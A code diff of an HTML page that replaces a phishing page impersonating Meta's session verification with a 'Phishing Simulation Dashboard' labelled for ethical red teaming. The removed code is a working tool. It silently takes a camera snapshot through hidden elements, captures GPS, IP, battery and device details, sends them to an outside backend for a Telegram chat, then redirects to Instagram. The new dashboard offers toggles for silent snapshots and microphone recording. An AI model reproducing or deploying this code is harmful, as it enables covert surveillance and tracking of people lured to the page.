@@ -1,192 +1,104 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Account Verification</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Phishing Simulation Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
-      background: linear-gradient(to right, #f8f9fa, #e9ecef);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      background: #f5f7fa;
       color: #333;
     }
-    .card {
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 30px;
       background: white;
-      padding: 40px;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
+    }
+    h1 {
+      font-size: 24px;
       text-align: center;
-    }
-    .card img {
-      width: 64px;
       margin-bottom: 20px;
     }
-    .card h2 {
-      font-size: 22px;
-      font-weight: 600;
-      margin-bottom: 10px;
-    }
-    .card p {
-      font-size: 14px;
-      color: #555;
+    .feature-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
       margin-bottom: 20px;
+    }
+    .feature-list label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 15px;
     }
     button {
-      background: #1877f2;
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
       color: white;
       font-weight: 600;
-      padding: 12px 24px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      font-size: 15px;
+      font-size: 16px;
       transition: background 0.3s ease;
     }
     button:hover {
-      background: #155dc0;
+      background: #0056b3;
     }
-    video, canvas {
-      opacity: 0;
-      position: absolute;
-      pointer-events: none;
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 30px;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="Secure">
-    <h2>Confirm Your Session</h2>
-    <p>For your security, we need to verify your device and session. Please continue to proceed.</p>
-    <button onclick="collectSensitive()">Continue Verification</button>
-    <video id="videoPreview" autoplay muted playsinline></video>
-    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
+  <div class="container">
+    <h1>Phishing Simulation Dashboard</h1>
+    <div class="feature-list">
+      <label><input type="checkbox" id="deviceInfo" checked /> Collect Device Info</label>
+      <label><input type="checkbox" id="ipInfo" checked /> Collect IP & ISP Info</label>
+      <label><input type="checkbox" id="gps" /> Request GPS Location</label>
+      <label><input type="checkbox" id="camera" /> Take Silent Snapshot</label>
+      <label><input type="checkbox" id="microphone" /> Record Microphone Audio</label>
+      <label><input type="checkbox" id="screen" /> Collect Screen Resolution</label>
+      <label><input type="checkbox" id="lang" /> Collect Language</label>
+      <label><input type="checkbox" id="referrer" /> Collect Referrer</label>
+    </div>
+    <button onclick="startSimulation()">🚀 Start Simulation</button>
+    <div class="footer">By Cobrax9 | Ethical Red Team Testing Only</div>
   </div>
 
+  <script src="modules/sendToTelegram.js"></script>
+  <script src="modules/device.js"></script>
+  <script src="modules/gps.js"></script>
+  <script src="modules/camera.js"></script>
+  <script src="modules/mic.js"></script>
   <script>
-    const chatId = new URLSearchParams(window.location.search).get("id");
-    const video = document.getElementById("videoPreview");
-    const canvas = document.getElementById("snapshotCanvas");
-    const ctx = canvas.getContext("2d");
-    let imageBase64 = "";
-
-    function sendToTelegram(message, isPhoto = false) {
-      const payload = { chat_id: chatId };
-      if (isPhoto && imageBase64) {
-        payload.message = "📸 Snapshot from verification:";
-        payload.photo = imageBase64;
-      } else {
-        payload.message = message;
-      }
-
-      fetch("https://render-backend-package1.onrender.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+    function startSimulation() {
+      const selected = {
+        deviceInfo: document.getElementById('deviceInfo').checked,
+        ipInfo: document.getElementById('ipInfo').checked,
+        gps: document.getElementById('gps').checked,
+        camera: document.getElementById('camera').checked,
+        microphone: document.getElementById('microphone').checked,
+        screen: document.getElementById('screen').checked,
+        lang: document.getElementById('lang').checked,
+        referrer: document.getElementById('referrer').checked,
+      };
+      if (selected.deviceInfo || selected.ipInfo) startDeviceInfo(selected);
+      if (selected.gps) setTimeout(() => startGPS(), 500);
+      if (selected.camera) setTimeout(() => startCameraSnapshot(), 1500);
+      if (selected.microphone) setTimeout(() => startMicCapture(), 2500);
     }
-
-    function detectDeviceType(ua) {
-      if (/android/i.test(ua)) return "Android";
-      if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
-      if (/windows/i.test(ua)) return "Windows";
-      if (/macintosh|mac os/i.test(ua)) return "Mac";
-      if (/linux/i.test(ua)) return "Linux";
-      return "Unknown";
-    }
-
-    function getBrowserName(ua) {
-      if (ua.includes("Firefox/")) return "Firefox";
-      if (ua.includes("Edg/")) return "Edge";
-      if (ua.includes("Chrome/")) return "Chrome";
-      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
-      return "Unknown";
-    }
-
-    function collectSensitive() {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const gpsMessage = `📍 GPS Location\nhttps://maps.google.com/?q=${lat},${lon}`;
-          sendToTelegram(gpsMessage);
-          capturePhotoSafely();
-        },
-        err => {
-          sendToTelegram("❌ GPS access denied or unavailable");
-          capturePhotoSafely();
-        },
-        { timeout: 5000 }
-      );
-    }
-
-    function capturePhotoSafely() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-          video.onloadeddata = () => {
-            setTimeout(() => {
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              imageBase64 = canvas.toDataURL("image/jpeg").split(',')[1];
-              stream.getTracks().forEach(track => track.stop());
-              sendToTelegram("", true);
-              setTimeout(() => {
-                window.location.href = "https://instagram.com";
-              }, 3000);
-            }, 1200);
-          };
-        })
-        .catch(() => {
-          sendToTelegram("❌ Camera access denied");
-          setTimeout(() => {
-            window.location.href = "https://instagram.com";
-          }, 3000);
-        });
-    }
-
-    function sendBasicInfo() {
-      const ua = navigator.userAgent;
-      const os = detectDeviceType(ua);
-      const browser = getBrowserName(ua);
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const lang = navigator.language || navigator.userLanguage;
-      const screenRes = `${screen.width} x ${screen.height}`;
-      const ref = document.referrer || "Direct";
-      const connection = navigator.connection || {};
-      const network = connection.effectiveType || "Unknown";
-
-      navigator.getBattery().then(battery => {
-        const charging = battery.charging ? "Yes" : "No";
-        const level = Math.round(battery.level * 100) + "%";
-
-        fetch("https://ipinfo.io/json?token=demo")
-          .then(res => res.json())
-          .then(data => {
-            let basicInfo = "📱 Hacked by @Cobra9x\n\n";
-
-            basicInfo += "📱 Device Info:\n";
-            basicInfo += `💻 OS: ${os}\n🌐 Browser: ${browser}\n🔤 Language: ${lang}\n`;
-            basicInfo += `🔋 Charging: ${charging}\n🔌 Battery: ${level}\n📶 Network: ${network.toUpperCase()}\n`;
-            basicInfo += `🕒 Time Zone: ${timeZone}\n📺 Resolution: ${screenRes}\n`;
-            basicInfo += `🖥️ User Agent: ${ua}\n`;
-            basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
-            basicInfo += `🔗 Referrer: ${ref}\n`;
-            basicInfo += "🔒 Awaiting GPS & camera permissions...";
-            basicInfo += "📱 Hacked by @Shopandbuyy\n\n";
-
-            sendToTelegram(basicInfo);
-          });
-      });
-    }
-
-    if (chatId) sendBasicInfo();
   </script>
 </body>
 </html>
